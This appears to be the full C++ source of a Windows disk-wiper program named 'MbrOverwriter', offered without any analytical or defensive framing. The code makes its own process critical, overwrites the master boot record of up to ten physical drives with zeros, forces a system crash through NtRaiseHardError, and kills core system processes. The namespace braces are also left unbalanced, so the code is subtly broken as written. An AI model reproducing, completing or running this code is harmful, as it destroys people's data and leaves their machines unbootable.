#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <mutex>
#include <tlhelp32.h>
#include <commctrl.h>
#pragma comment(lib, "comctl32.lib")
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

namespace MbrOverwriter
{
constexpr int BreakOnTermination = 29;
namespace MbrOverwriter
{
    class Class1
    {
    public:
        static int isCritical;
        typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
        typedef NTSTATUS(NTAPI* pfnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
        typedef NTSTATUS(NTAPI* pfnNtSetInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
        static const uint32_t GenericRead = 0x80000000;
        static const uint32_t GenericWrite = 0x40000000;
        static const uint32_t GenericExecute = 0x20000000;
        static const uint32_t GenericAll = 0x10000000;

        static const uint32_t FileShareRead = 0x1;
        static const uint32_t FileShareWrite = 0x2;
        static const uint32_t OpenExisting = 0x3;
        static const uint32_t FileFlagDeleteOnClose = 0x40000000;
        static const uint32_t MbrSize = 512u;

        static void KillProcessByName(const std::wstring& processName)
        {
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap == INVALID_HANDLE_VALUE) return;

            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(PROCESSENTRY32W);

            if (Process32FirstW(hSnap, &pe))
            {
                do
                {
                    if (std::wstring(pe.szExeFile) == processName || std::wstring(pe.szExeFile) == processName + L".exe")
                    {
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hProc != NULL)
                        {
                            TerminateProcess(hProc, 0);
                            CloseHandle(hProc);
                        }
                        break;
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }

        static void Main(int argc, char* argv[])
        {
            HANDLE hToken;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            {
                LUID luid;
                if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
                {
                    TOKEN_PRIVILEGES tp;
                    tp.PrivilegeCount = 1;
                    tp.Privileges[0].Luid = luid;
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
                }
                CloseHandle(hToken);
            }
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (hNtdll)
            {
                MbrOverwriter::Class1::pfnNtSetInformationProcess NtSetInformationProcess = nullptr;
                NtSetInformationProcess = (pfnNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
                if (NtSetInformationProcess)
                {
                    NtSetInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)BreakOnTermination, &MbrOverwriter::Class1::isCritical, sizeof(int));
                }
            }

            try
            {
                unsigned char mbrData[] = {
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                };

                HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
                HANDLE mbr1 = CreateFileW(L"\\\\.\\PhysicalDrive1", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
                HANDLE mbr2 = CreateFileW(L"\\\\.\\PhysicalDrive2", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
                HANDLE mbr3 = CreateFileW(L"\\\\.\\PhysicalDrive3", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
                HANDLE mbr4 = CreateFileW(L"\\\\.\\PhysicalDrive4", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
                HANDLE mbr5 = CreateFileW(L"\\\\.\\PhysicalDrive5", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
                HANDLE mbr6 = CreateFileW(L"\\\\.\\PhysicalDrive6", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
                HANDLE mbr7 = CreateFileW(L"\\\\.\\PhysicalDrive7", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
                HANDLE mbr8 = CreateFileW(L"\\\\.\\PhysicalDrive8", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
                HANDLE mbr9 = CreateFileW(L"\\\\.\\PhysicalDrive9", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);

                DWORD lpNumberOfBytesWritten;
                WriteFile(mbr, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
                WriteFile(mbr1, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
                WriteFile(mbr2, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
                WriteFile(mbr3, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
                WriteFile(mbr4, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
                WriteFile(mbr5, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
                WriteFile(mbr6, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
                WriteFile(mbr7, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
                WriteFile(mbr8, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
                WriteFile(mbr9, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);

                if (mbr != INVALID_HANDLE_VALUE) CloseHandle(mbr);
                if (mbr1 != INVALID_HANDLE_VALUE) CloseHandle(mbr1);
                if (mbr2 != INVALID_HANDLE_VALUE) CloseHandle(mbr2);
                if (mbr3 != INVALID_HANDLE_VALUE) CloseHandle(mbr3);
                if (mbr4 != INVALID_HANDLE_VALUE) CloseHandle(mbr4);
                if (mbr5 != INVALID_HANDLE_VALUE) CloseHandle(mbr5);
                if (mbr6 != INVALID_HANDLE_VALUE) CloseHandle(mbr6);
                if (mbr7 != INVALID_HANDLE_VALUE) CloseHandle(mbr7);
                if (mbr8 != INVALID_HANDLE_VALUE) CloseHandle(mbr8);
                if (mbr9 != INVALID_HANDLE_VALUE) CloseHandle(mbr9);
            }
            catch (...)
            {
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(12000));
            BOOLEAN t1;
            ULONG t2;
            if (hNtdll)
            {
                pfnRtlAdjustPrivilege RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
                pfnNtRaiseHardError NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

                if (RtlAdjustPrivilege)
                {
                    RtlAdjustPrivilege(19, TRUE, FALSE, &t1);
                }
                if (NtRaiseHardError)
                {
                    NtRaiseHardError(0xDEADDEAD, 0, 0, NULL, 6, &t2);
                }
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(5));
            KillProcessByName(L"wininit");
            KillProcessByName(L"services");
            KillProcessByName(L"csrss");
        }
    };
    int Class1::isCritical = 1;
}

int main(int argc, char* argv[])
{
    MbrOverwriter::Class1::Main(argc, argv);
    return 0;
}
